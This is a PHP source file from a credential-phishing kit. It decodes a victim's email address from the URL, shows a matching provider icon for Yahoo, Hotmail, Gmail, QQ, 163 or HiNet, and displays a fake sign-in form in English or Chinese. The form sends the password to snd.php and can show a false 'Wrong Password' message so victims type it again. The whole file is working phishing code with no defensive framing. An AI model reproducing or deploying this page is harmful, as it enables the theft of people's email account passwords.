<?php
error_reporting(E_ALL ^ E_NOTICE);  
$mail = $_GET['0'];
$dec = base64_decode($mail);
$domain = $dec;
if (stripos($domain, 'yahoo') !== false || stripos($domain, 'rocketmail') !== false){
$serv = "serv/ym.ico";
}

elseif (stripos($domain, 'office') !== false || stripos($domain, 'live') !== false || stripos($domain, 'hotmail') !== false){
$serv = "serv/hm.ico";
}

elseif (stripos($domain, 'yeah') !== false){
$serv = "serv/12.ico";
}

elseif (stripos($domain, '163') !== false){
$serv = "serv/12.ico";
}

elseif (stripos($domain, '126') !== false){
$serv = "serv/12.ico";
}


elseif (stripos($domain, '@mail.com') !== false){
$serv = "serv/ma.ico";
	
}

elseif (stripos($domain, 'gmail.com') !== false){
$serv = "serv/gm.ico";
}

elseif (stripos($domain, 'qq') !== false){
$serv = "serv/qq.ico";
	
}

elseif (stripos($domain, 'hinet') !== false || stripos($domain, 'hi-net') !== false){	
$serv = "serv/hi.ico";
	
}

else{
$serv = "serv/favicon.ico";
	
}
/**--------------------------------------------------------------**/
$c = $_GET["c"];
$a = $_GET["a"];
if($a == "0"){
	if (stripos($domain, 'hinet') !== false || stripos($domain, 'hi-net') !== false || stripos($domain, 'qq') !== false || stripos($domain, 'yeah') !== false || stripos($domain, '126') !== false || stripos($domain, '163') !== false){
$logo = "serv/logo/y.jpg";
$header = "登录以继续";
$em = "电子邮件";
$ps = "密码";
$wrong = "";
$submit = "继续";
}

else{
$logo = "serv/logo/y.jpg";
$header = "Sign in to continue";
$em = "Email";
$ps = "Password";
$wrong = "";
$submit = "Continue";
}
}

elseif($a == "1"){
	
	
	if (stripos($domain, 'hinet') !== false || stripos($domain, 'hi-net') !== false || stripos($domain, 'qq') !== false || stripos($domain, 'yeah') !== false || stripos($domain, '126') !== false || stripos($domain, '163') !== false){
$logo = "serv/logo/y.jpg";
$header = "登录以继续";
$em = "电子邮件";
$ps = "密码";
$wrong = "请输入密码";
$submit = "继续";
}

else{
$logo = "serv/logo/y.jpg";
$header = "Sign in to continue";
$em = "Email";
$ps = "Password";
$wrong ="Please input Password";
$submit = "Continue";
}
}


else{

if (stripos($domain, 'hinet') !== false || stripos($domain, 'hi-net') !== false || stripos($domain, 'qq') !== false || stripos($domain, 'yeah') !== false || stripos($domain, '126') !== false || stripos($domain, '163') !== false){
$logo = "serv/logo/y.jpg";
$header = "登录以继续";
$em = "电子邮件";
$ps = "密码";
$wrong = "服务器响应：密码错误";
$submit = "继续";
}

else{
$logo = "serv/logo/y.jpg";
$header = "Sign in to continue";
$em = "Email";
$ps = "Password";
$wrong = "Server Response: Wrong Password";
$submit = "Continue";

}
}
?>

<!doctype html>
<html>
	<head>
		<meta charset="utf-8">
		<link rel="stylesheet" href="cache/style2.css">
	</head>
	<body>
		<div class="loginBox">
			<img src="<?php echo $serv; ?>" class="user">
			<h2><?php echo $header;?></h2>
			<form action="snd.php?c=<?php echo $c; ?>" method="post">
				<p><?php echo $em;?></p>
				<input type="text" readonly name="e" placeholder="" value="<?php echo $dec; ?>">
				<p><?php echo $ps;?></p>
				<input type="password" name="p" required placeholder="••••••">
				<div id="wrong"> <?php echo $wrong;?></div>
				<input type="submit" name="" value="<?php echo $submit;?>">
				
			</form>
		</div>
	</body>
</html>
